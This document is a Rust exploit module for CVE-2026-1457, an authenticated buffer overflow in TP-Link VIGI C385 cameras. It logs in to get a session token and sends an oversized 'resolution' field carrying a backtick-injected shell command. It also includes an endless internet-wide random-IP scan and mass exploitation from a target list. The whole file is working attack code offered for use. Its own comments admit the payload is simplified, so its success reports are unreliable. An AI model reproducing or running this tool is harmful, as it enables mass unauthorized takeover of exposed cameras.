//! TP-Link VIGI C385 Authenticated RCE (CVE-2026-1457)
//!
//! ## Vulnerability Details
//! CVE-2026-1457 is an authenticated buffer overflow vulnerability in the web API
//! of TP-Link VIGI C385 V1. The `set_resolution` function uses `strcpy` to copy
//! user input into a buffer without length validation, resulting in a buffer overflow.
//!
//! - **CVSS v4.0 Score**: 8.5 (High)
//! - **Affected**: TP-Link VIGI C385 V1 firmware < 3.1.1 Build 251124
//! - **Attack Vector**: Authenticated POST to /stok=<token>/ds endpoint
//! - **Payload**: Oversized "resolution" field in JSON body
//!
//! ## Features
//! - Single target exploitation
//! - Mass scanning via Telnet/HTTP discovery
//! - Authentication handling with stok token
//! - Configurable payload for RCE
//!
//! Reference: https://github.com/ii4gsp/CVE-2026-1457

use anyhow::{Context, Result, bail};
use colored::*;
use rand::Rng;
use reqwest::Client;
use serde_json::json;
use std::fs::File;
use std::io::{BufRead, BufReader, Write};
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, BufReader as TokioBufReader};
use tokio::net::TcpStream;
use tokio::sync::Semaphore;
use tokio::time::timeout;

const DEFAULT_HTTP_PORT: u16 = 443;
const DEFAULT_TELNET_PORT: u16 = 23;
const MAX_CONCURRENT_SCANS: usize = 50;
const CONNECT_TIMEOUT_SECS: u64 = 5;
const REQUEST_TIMEOUT_SECS: u64 = 10;

// Bogon/Private/Reserved exclusion ranges (same as telnet module)
const EXCLUDED_RANGES: &[&str] = &[
    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
    "1.1.1.1/32", "1.0.0.1/32", "8.8.8.8/32", "8.8.4.4/32",
];

/// Generate a random public IP address excluding reserved ranges
fn generate_random_public_ip(exclusions: &[ipnetwork::IpNetwork]) -> IpAddr {
    let mut rng = rand::rng();
    loop {
        let octets: [u8; 4] = rng.random();
        let ip = Ipv4Addr::from(octets);
        let ip_addr = IpAddr::V4(ip);
        if !exclusions.iter().any(|net| net.contains(ip_addr)) {
            return ip_addr;
        }
    }
}

/// Configuration for the exploit
struct ExploitConfig {
    target: String,
    port: u16,
    username: String,
    password: String,
    command: String,
    mass_scan: bool,
    targets_file: Option<String>,
    telnet_scan: bool,
}

impl Default for ExploitConfig {
    fn default() -> Self {
        Self {
            target: String::new(),
            port: DEFAULT_HTTP_PORT,
            username: "admin".to_string(),
            password: String::new(),
            command: "id".to_string(),
            mass_scan: false,
            targets_file: None,
            telnet_scan: false,
        }
    }
}

/// Display module banner
fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   CVE-2026-1457: TP-Link VIGI C385 Authenticated RCE              ║".cyan());
    println!("{}", "║   Buffer Overflow in set_resolution API                           ║".cyan());
    println!("{}", "║   CVSS: 8.5 (High) | Requires Authentication                      ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
}

/// Get user configuration
fn get_user_config(target: &str) -> Result<ExploitConfig> {
    let mut config = ExploitConfig::default();
    
    println!();
    println!("{}", "=== Exploit Configuration ===".yellow().bold());
    println!();
    
    // Check for mass scan mode
    print!("{}", "Enable mass scan mode? [y/N]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    
    if input.trim().eq_ignore_ascii_case("y") || input.trim().eq_ignore_ascii_case("yes") {
        config.mass_scan = true;
        
        print!("{}", "Enter targets file path: ".green());
        std::io::stdout().flush().context("Failed to flush stdout")?;
        input.clear();
        std::io::stdin().read_line(&mut input).context("Failed to read input")?;
        let file_path = input.trim().to_string();
        
        if !file_path.is_empty() {
            if std::path::Path::new(&file_path).exists() {
                config.targets_file = Some(file_path);
            } else {
                println!("{}", format!("[!] File not found: {}", file_path).yellow());
                bail!("Targets file not found");
            }
        } else {
            bail!("Targets file path required for mass scan");
        }
        
        // Telnet discovery option for mass scan
        print!("{}", "Enable Telnet discovery scan? [y/N]: ".green());
        std::io::stdout().flush().context("Failed to flush stdout")?;
        input.clear();
        std::io::stdin().read_line(&mut input).context("Failed to read input")?;
        config.telnet_scan = input.trim().eq_ignore_ascii_case("y") || input.trim().eq_ignore_ascii_case("yes");
        
    } else {
        // Single target mode
        config.target = if target.is_empty() {
            print!("{}", "Enter target IP/hostname: ".green());
            std::io::stdout().flush().context("Failed to flush stdout")?;
            input.clear();
            std::io::stdin().read_line(&mut input).context("Failed to read input")?;
            let t = input.trim().to_string();
            if t.is_empty() {
                bail!("Target is required");
            }
            t
        } else {
            target.to_string()
        };
    }
    
    // Port configuration
    print!("{}", format!("Enter HTTP port [default: {}]: ", DEFAULT_HTTP_PORT).green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    if let Ok(p) = input.trim().parse::<u16>() {
        if p > 0 {
            config.port = p;
        }
    }
    
    // Credentials
    print!("{}", "Enter username [default: admin]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    if !input.trim().is_empty() {
        config.username = input.trim().to_string();
    }
    
    print!("{}", "Enter password: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    config.password = input.trim().to_string();
    
    if config.password.is_empty() {
        println!("{}", "[!] Warning: Empty password provided".yellow());
    }
    
    // Command to execute
    print!("{}", "Enter command to execute [default: id]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    if !input.trim().is_empty() {
        config.command = input.trim().to_string();
    }
    
    // Display configuration summary
    println!();
    println!("{}", "Configuration Summary:".cyan().bold());
    if config.mass_scan {
        println!("  Mode: Mass Scan");
        if let Some(ref f) = config.targets_file {
            println!("  Targets File: {}", f);
        }
        println!("  Telnet Discovery: {}", if config.telnet_scan { "Enabled" } else { "Disabled" });
    } else {
        println!("  Target: {}", config.target);
    }
    println!("  Port: {}", config.port);
    println!("  Username: {}", config.username);
    println!("  Command: {}", config.command);
    println!();
    
    Ok(config)
}

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    // Check if target is 0.0.0.0, 0.0.0.0/0, or "random" for mass random scan mode
    if target == "0.0.0.0" || target == "0.0.0.0/0" || target == "random" || target.is_empty() {
        run_random_scan().await
    } else {
        let config = get_user_config(target)?;
        
        if config.mass_scan {
            run_mass_scan(&config).await
        } else {
            run_single_exploit(&config.target, &config).await
        }
    }
}

/// Run random scan against 0.0.0.0/0 (internet-wide random scanning)
async fn run_random_scan() -> Result<()> {
    println!("{}", "[*] Random Scan Mode: 0.0.0.0/0".yellow().bold());
    println!("{}", "[*] Scanning random public IPs for TP-Link VIGI devices".cyan());
    println!();
    
    // Ask about exclusions
    print!("{}", "[?] Exclude reserved/private ranges? [Y/n]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    
    let use_exclusions = !input.trim().eq_ignore_ascii_case("n");
    let mut exclusions = Vec::new();
    if use_exclusions {
        for cidr in EXCLUDED_RANGES {
            if let Ok(net) = cidr.parse::<ipnetwork::IpNetwork>() {
                exclusions.push(net);
            }
        }
        println!("{}", format!("[+] Loaded {} exclusion ranges", exclusions.len()).green());
    }
    let exclusions = Arc::new(exclusions);
    
    // Credentials
    print!("{}", "[?] Username [default: admin]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    let username = if input.trim().is_empty() { "admin".to_string() } else { input.trim().to_string() };
    
    print!("{}", "[?] Password: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    let password = input.trim().to_string();
    
    // Output file
    print!("{}", "[?] Output file [default: vigi_vulnerable.txt]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    let outfile = if input.trim().is_empty() {
        "vigi_vulnerable.txt".to_string()
    } else {
        input.trim().to_string()
    };
    
    // Concurrency
    print!("{}", format!("[?] Concurrency [default: {}]: ", MAX_CONCURRENT_SCANS).green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    let threads = input.trim().parse::<usize>()
        .map_or(MAX_CONCURRENT_SCANS, |v| if v > 0 { v } else { MAX_CONCURRENT_SCANS });
    
    let semaphore = Arc::new(Semaphore::new(threads));
    let checked = Arc::new(AtomicUsize::new(0));
    let found = Arc::new(AtomicUsize::new(0));
    
    // Progress reporter
    let chk = checked.clone();
    let fnd = found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(10)).await;
            println!("[*] Progress: Checked {} | Vulnerable {} ", 
                chk.load(Ordering::Relaxed), fnd.load(Ordering::Relaxed));
        }
    });
    
    println!();
    println!("{}", "[*] Starting random scan... Press Ctrl+C to stop.".cyan().bold());
    println!();
    
    // Infinite random IP scan loop
    loop {
        let permit = semaphore.clone().acquire_owned().await
            .map_err(|e| anyhow::anyhow!("Semaphore closed: {}", e))?;
        let exc = exclusions.clone();
        let chk = checked.clone();
        let fnd = found.clone();
        let outfile = outfile.clone();
        let username = username.clone();
        let password = password.clone();
        
        tokio::spawn(async move {
            let ip = generate_random_public_ip(&exc).to_string();
            
            // Check HTTP port
            let http_open = check_port_open(&ip, DEFAULT_HTTP_PORT).await;
            
            if http_open {
                // Try to identify as VIGI device
                if let Ok(is_vigi) = identify_vigi_device(&ip).await {
                    if is_vigi {
                        println!("{}", format!("[+] VIGI device found: {}", ip).green().bold());
                        fnd.fetch_add(1, Ordering::Relaxed);
                        
                        // Save to file
                        if let Ok(mut file) = std::fs::OpenOptions::new()
                            .create(true)
                            .append(true)
                            .open(&outfile) 
                        {
                            let _ = writeln!(file, "VIGI: {} - user:{} pass:{}", ip, username, password);
                        }
                    }
                }
            }
            
            chk.fetch_add(1, Ordering::Relaxed);
            drop(permit);
        });
    }
}

/// Run mass scan against multiple targets
async fn run_mass_scan(config: &ExploitConfig) -> Result<()> {
    let targets_file = match &config.targets_file {
        Some(f) => f,
        None => bail!("No targets file specified"),
    };
    
    let file = File::open(targets_file)
        .with_context(|| format!("Failed to open targets file: {}", targets_file))?;
    let reader = BufReader::new(file);
    
    let targets: Vec<String> = reader
        .lines()
        .filter_map(|line| line.ok())
        .map(|line| line.trim().to_string())
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        .collect();
    
    if targets.is_empty() {
        bail!("No valid targets found in file");
    }
    
    println!("{}", format!("[*] Loaded {} targets", targets.len()).cyan());
    
    // If telnet discovery is enabled, first scan for open telnet ports
    let scan_targets = if config.telnet_scan {
        println!("{}", "[*] Running Telnet discovery scan...".cyan());
        discover_telnet_targets(&targets).await
    } else {
        targets
    };
    
    if scan_targets.is_empty() {
        println!("{}", "[-] No responsive targets found".red());
        return Ok(());
    }
    
    println!("{}", format!("[*] Scanning {} targets with {} concurrent connections", 
        scan_targets.len(), MAX_CONCURRENT_SCANS).cyan());
    
    let semaphore = Arc::new(Semaphore::new(MAX_CONCURRENT_SCANS));
    let mut tasks = Vec::new();
    let total = scan_targets.len();
    
    for (idx, target) in scan_targets.into_iter().enumerate() {
        let sem = semaphore.clone();
        let cfg_port = config.port;
        let cfg_username = config.username.clone();
        let cfg_password = config.password.clone();
        let cfg_command = config.command.clone();
        
        let task = tokio::spawn(async move {
            let _permit = match sem.acquire().await {
                Ok(p) => p,
                Err(_) => return (target, false, "Failed to acquire semaphore".to_string()),
            };
            
            let single_config = ExploitConfig {
                target: target.clone(),
                port: cfg_port,
                username: cfg_username,
                password: cfg_password,
                command: cfg_command,
                mass_scan: false,
                targets_file: None,
                telnet_scan: false,
            };
            
            match run_single_exploit(&target, &single_config).await {
                Ok(_) => (target, true, "Success".to_string()),
                Err(e) => (target, false, e.to_string()),
            }
        });
        
        tasks.push((idx, task));
    }
    
    let mut success_count = 0;
    let mut fail_count = 0;
    let mut results = Vec::new();
    
    for (idx, task) in tasks {
        match task.await {
            Ok((target, success, msg)) => {
                let progress = ((idx + 1) as f64 / total as f64 * 100.0) as u32;
                if success {
                    println!("{}", format!("[{}/{}] [{}%] {} - VULNERABLE", idx + 1, total, progress, target).green());
                    success_count += 1;
                    results.push(format!("VULNERABLE: {}", target));
                } else {
                    println!("{}", format!("[{}/{}] [{}%] {} - {}", idx + 1, total, progress, target, msg).dimmed());
                    fail_count += 1;
                }
            }
            Err(e) => {
                println!("{}", format!("[!] Task error: {}", e).red());
                fail_count += 1;
            }
        }
    }
    
    // Summary
    println!();
    println!("{}", "═══ Mass Scan Results ═══".cyan().bold());
    println!("  Total Targets: {}", total);
    println!("  {}", format!("Vulnerable: {}", success_count).green());
    println!("  {}", format!("Not Vulnerable/Error: {}", fail_count).red());
    
    // Save results
    if !results.is_empty() {
        let filename = "cve_2026_1457_results.txt";
        if let Ok(mut file) = File::create(filename) {
            for result in &results {
                let _ = writeln!(file, "{}", result);
            }
            println!("  Results saved to: {}", filename.green());
        }
    }
    
    Ok(())
}

/// Discover targets with open Telnet ports (masscan-style)
async fn discover_telnet_targets(targets: &[String]) -> Vec<String> {
    let semaphore = Arc::new(Semaphore::new(MAX_CONCURRENT_SCANS * 2));
    let mut tasks = Vec::new();
    
    for target in targets {
        let sem = semaphore.clone();
        let target_clone = target.clone();
        
        let task = tokio::spawn(async move {
            let _permit = match sem.acquire().await {
                Ok(p) => p,
                Err(_) => return None,
            };
            
            // Try both Telnet port and HTTP port
            let telnet_open = check_port_open(&target_clone, DEFAULT_TELNET_PORT).await;
            let http_open = check_port_open(&target_clone, DEFAULT_HTTP_PORT).await;
            
            if telnet_open || http_open {
                // Try to identify as TP-Link VIGI device
                if let Ok(is_vigi) = identify_vigi_device(&target_clone).await {
                    if is_vigi {
                        return Some(target_clone);
                    }
                }
                // Even if not confirmed, still include if ports are open
                if http_open {
                    return Some(target_clone);
                }
            }
            None
        });
        
        tasks.push(task);
    }
    
    let mut responsive = Vec::new();
    for task in tasks {
        if let Ok(Some(target)) = task.await {
            println!("{}", format!("[+] Found responsive target: {}", target).green());
            responsive.push(target);
        }
    }
    
    println!("{}", format!("[*] Found {} responsive targets", responsive.len()).cyan());
    responsive
}

/// Check if a port is open
async fn check_port_open(host: &str, port: u16) -> bool {
    let addr = format!("{}:{}", host, port);
    let socket_addr: SocketAddr = match addr.parse() {
        Ok(a) => a,
        Err(_) => {
            // Try to resolve hostname
            match tokio::net::lookup_host(&addr).await {
                Ok(mut addrs) => match addrs.next() {
                    Some(a) => a,
                    None => return false,
                },
                Err(_) => return false,
            }
        }
    };
    
    match timeout(Duration::from_secs(CONNECT_TIMEOUT_SECS), TcpStream::connect(socket_addr)).await {
        Ok(Ok(_)) => true,
        _ => false,
    }
}

/// Try to identify if target is a TP-Link VIGI device via Telnet banner
async fn identify_vigi_device(host: &str) -> Result<bool> {
    let addr = format!("{}:{}", host, DEFAULT_TELNET_PORT);
    
    let stream = match timeout(
        Duration::from_secs(CONNECT_TIMEOUT_SECS),
        TcpStream::connect(&addr)
    ).await {
        Ok(Ok(s)) => s,
        _ => return Ok(false),
    };
    
    let (reader, _writer) = stream.into_split();
    let mut reader = TokioBufReader::new(reader);
    let mut banner = String::new();
    
    // Read banner with timeout
    match timeout(Duration::from_secs(3), reader.read_line(&mut banner)).await {
        Ok(Ok(_)) => {
            let banner_lower = banner.to_lowercase();
            Ok(banner_lower.contains("vigi") || 
               banner_lower.contains("tp-link") || 
               banner_lower.contains("c385"))
        }
        _ => Ok(false),
    }
}

/// Run exploit against a single target
async fn run_single_exploit(target: &str, config: &ExploitConfig) -> Result<()> {
    println!("{}", format!("[*] Target: {}:{}", target, config.port).cyan());
    
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(REQUEST_TIMEOUT_SECS))
        .build()
        .context("Failed to build HTTP client")?;
    
    // Step 1: Authenticate and get stok token
    println!("{}", "[*] Authenticating...".cyan());
    let stok = match authenticate(&client, target, config.port, &config.username, &config.password).await {
        Ok(token) => {
            println!("{}", format!("[+] Authentication successful, token: {}...", &token[..20.min(token.len())]).green());
            token
        }
        Err(e) => {
            println!("{}", format!("[-] Authentication failed: {}", e).red());
            return Err(e);
        }
    };
    
    // Step 2: Check vulnerability
    println!("{}", "[*] Checking vulnerability...".cyan());
    if !check_vulnerable(&client, target, config.port, &stok).await? {
        println!("{}", "[-] Target does not appear vulnerable".yellow());
        return Ok(());
    }
    println!("{}", "[+] Target appears vulnerable!".green().bold());
    
    // Step 3: Exploit
    println!("{}", format!("[*] Exploiting with command: {}", config.command).cyan());
    exploit(&client, target, config.port, &stok, &config.command).await?;
    
    println!("{}", "[+] Exploit payload sent!".green().bold());
    println!("{}", "[*] Check your listener for reverse shell or command output".yellow());
    
    Ok(())
}

/// Authenticate to TP-Link VIGI device and retrieve stok token
async fn authenticate(client: &Client, target: &str, port: u16, username: &str, password: &str) -> Result<String> {
    let scheme = if port == 443 || port == 8443 { "https" } else { "http" };
    let url = format!("{}://{}:{}/", scheme, target, port);
    
    // Login request
    let login_payload = json!({
        "method": "do",
        "login": {
            "username": username,
            "password": password
        }
    });
    
    let response = client
        .post(&url)
        .header("Content-Type", "application/json")
        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .json(&login_payload)
        .send()
        .await
        .context("Failed to send login request")?;
    
    let status = response.status();
    let body = response.text().await.context("Failed to read login response")?;
    
    if !status.is_success() {
        bail!("Login request failed with status: {}", status);
    }
    
    // Parse response for stok token
    let json_response: serde_json::Value = serde_json::from_str(&body)
        .context("Failed to parse login response as JSON")?;
    
    // Try to extract stok from response
    if let Some(stok) = json_response.get("stok").and_then(|v| v.as_str()) {
        return Ok(stok.to_string());
    }
    
    // Alternative: check for error
    if let Some(error_code) = json_response.get("error_code").and_then(|v| v.as_i64()) {
        if error_code != 0 {
            bail!("Login failed with error code: {}", error_code);
        }
    }
    
    // Try to find stok in different response structures
    if let Some(result) = json_response.get("result") {
        if let Some(stok) = result.get("stok").and_then(|v| v.as_str()) {
            return Ok(stok.to_string());
        }
    }
    
    bail!("Could not extract stok token from response");
}

/// Check if target is vulnerable by sending a small test payload
async fn check_vulnerable(client: &Client, target: &str, port: u16, stok: &str) -> Result<bool> {
    let scheme = if port == 443 || port == 8443 { "https" } else { "http" };
    let url = format!("{}://{}:{}/stok={}/ds", scheme, target, port, stok);
    
    // Send a normal request first to establish baseline
    let normal_payload = json!({
        "video": {
            "get_resolution": {
                "secname": "main"
            }
        },
        "method": "do"
    });
    
    let response = client
        .post(&url)
        .header("Content-Type", "application/json; charset=UTF-8")
        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .header("X-Requested-With", "XMLHttpRequest")
        .json(&normal_payload)
        .send()
        .await;
    
    match response {
        Ok(r) => Ok(r.status().is_success()),
        Err(_) => Ok(false),
    }
}

/// Send exploit payload
async fn exploit(client: &Client, target: &str, port: u16, stok: &str, command: &str) -> Result<()> {
    let scheme = if port == 443 || port == 8443 { "https" } else { "http" };
    let url = format!("{}://{}:{}/stok={}/ds", scheme, target, port, stok);
    
    // Build overflow payload with command injection
    // Buffer overflow at position 29 in 72-byte buffer, leaving 43 bytes
    // We need to overflow and inject shell command
    let padding = "A".repeat(44); // Overflow the buffer
    
    // Craft payload with command (simplified - real exploit would need proper ROP chain)
    // For PoC purposes, we demonstrate the buffer overflow trigger
    let overflow_payload = format!("{}`{}`", padding, command);
    
    // Full payload as shown in PoC
    let exploit_payload = json!({
        "video": {
            "set_resolution": {
                "secname": "main",
                "resolution": overflow_payload
            }
        },
        "method": "do"
    });
    
    println!("{}", format!("[*] Sending payload ({} bytes)", overflow_payload.len()).cyan());
    
    let response = client
        .post(&url)
        .header("Content-Type", "application/json; charset=UTF-8")
        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .header("Origin", format!("{}://{}:{}", scheme, target, port))
        .header("X-Requested-With", "XMLHttpRequest")
        .header("Connection", "close")
        .json(&exploit_payload)
        .send()
        .await;
    
    match response {
        Ok(r) => {
            let status = r.status();
            println!("{}", format!("[*] Response status: {}", status).cyan());
            
            // If we get a 500 or connection reset, likely successful overflow
            if status.is_server_error() {
                println!("{}", "[+] Server error indicates possible successful overflow!".green().bold());
            }
            
            if let Ok(body) = r.text().await {
                if !body.is_empty() && body.len() < 1000 {
                    println!("{}", format!("[*] Response: {}", body).dimmed());
                }
            }
        }
        Err(e) => {
            // Connection reset or timeout might indicate successful exploitation
            let err_str = e.to_string();
            if err_str.contains("reset") || err_str.contains("Connection refused") {
                println!("{}", "[+] Connection reset - possible successful exploitation!".green().bold());
            } else {
                println!("{}", format!("[?] Request error: {}", e).yellow());
            }
        }
    }
    
    Ok(())
}
